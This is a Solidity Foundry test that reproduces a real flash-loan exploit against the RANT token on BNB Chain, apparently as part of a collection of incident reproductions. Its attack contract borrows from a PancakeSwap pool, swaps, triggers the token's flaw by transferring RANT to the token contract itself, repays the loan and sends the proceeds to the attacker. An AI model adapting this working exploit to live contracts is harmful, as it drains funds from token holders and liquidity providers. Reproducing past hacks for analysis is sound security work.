// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ 311.4 BNB
// Attacker : https://bscscan.com/address/0xad2cb8f48e74065a0b884af9c5a4ecbba101be23
// Attack Contract : https://bscscan.com/address/0x1e2d48e640243b04a9fa76eb49080e9ab110b4ac
// Vulnerable Contract : https://bscscan.com/address/0xc321ac21a07b3d593b269acdace69c3762ca2dd0
// Attack Tx : https://bscscan.com/tx/0x2d9c1a00cf3d2fda268d0d11794ad2956774b156355e16441d6edb9a448e5a99

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xc321ac21a07b3d593b269acdace69c3762ca2dd0#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/Phalcon_xyz/status/1941788315549946225
// Twitter Guy : https://x.com/AgentLISA_ai/status/1942162643437203531
// Hacking God : N/A

address constant RANT = 0xc321AC21A07B3d593B269AcdaCE69C3762CA2dd0;
address constant wBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant BSC_USD = 0x55d398326f99059fF775485246999027B3197955;
address constant PANCAKE_V3_POOL = 0x172fcD41E0913e95784454622d1c3724f546f849;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant CAKE_LP = 0x42A93C3aF7Cb1BBc757dd2eC4977fd6D7916Ba1D;
address constant BNB_EVE = 0xD3b0d838cCCEAe7ebF1781D11D1bB741DB7Fe1A7;

contract RANTToken_exp is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 52_974_382 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        // Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        // fundingToken = BSC_USD;

        vm.label(RANT, "RANT");
        vm.label(wBNB, "WBNB");
        vm.label(BSC_USD, "BSC-USD");
        vm.label(PANCAKE_V3_POOL, "PancakeV3Pool");
        vm.label(PANCAKE_ROUTER, "PancakeSwap: Router v2");
        vm.label(CAKE_LP, "0x42a9_Cake-LP");
        vm.label(BNB_EVE, "Validator : BNBEve");
    }

    function testExploit() public balanceLog {
        AttackContract attackContract = new AttackContract();
        attackContract.start();
    }

    receive() external payable {
        // Handle the received funds
    }
}

contract AttackContract {
    address attacker;
    uint256 borrowAmount = 2_813_769_505_544_453_342_436;

    constructor() {
        attacker = msg.sender;
    }

    function start() public {
        IPancakeV3PoolActions(PANCAKE_V3_POOL).flash(
            address(this), 0, borrowAmount, hex"00000000000000000000000000000000000000000000009888e5694d8ba9c4e4"
        );
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        IWBNB(payable(wBNB)).approve(PANCAKE_ROUTER, type(uint256).max);
        IPancakePair(CAKE_LP).swap(
            0,
            96_605_739_642_631_517_916_080_650,
            address(this),
            hex"00000000000000000000000000000000000000000000009888e5694d8ba9c4e4"
        );

        IERC20(RANT).transfer(RANT, 10_733_970_071_403_501_990_675_973);

        // console.log("Received funds in AttackContract: %s", address(this).balance);
        IWBNB(payable(wBNB)).deposit{value: address(this).balance}();

        IWBNB(payable(wBNB)).transfer(PANCAKE_V3_POOL, borrowAmount + fee1);

        uint256 withdraw = IWBNB(payable(wBNB)).balanceOf(address(this));
        // console.log("Withdrawn from wBNB: %s", withdraw);
        IWBNB(payable(wBNB)).withdraw(withdraw);
        // console.log("Withdrawn from wBNB: %s", address(this).balance);

        //???
        (bool success,) = payable(BNB_EVE).call{value: 0.1 ether}(""); // Send all BNB to the validator

        (bool success2,) = payable(attacker).call{value: address(this).balance}(""); // Send all BNB to the attacker
    }

    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        IWBNB(payable(wBNB)).transfer(CAKE_LP, borrowAmount);
    }

    receive() external payable {
        // Handle the received funds
        // console.log("Received funds in AttackContract: %s", msg.value);
    }
}
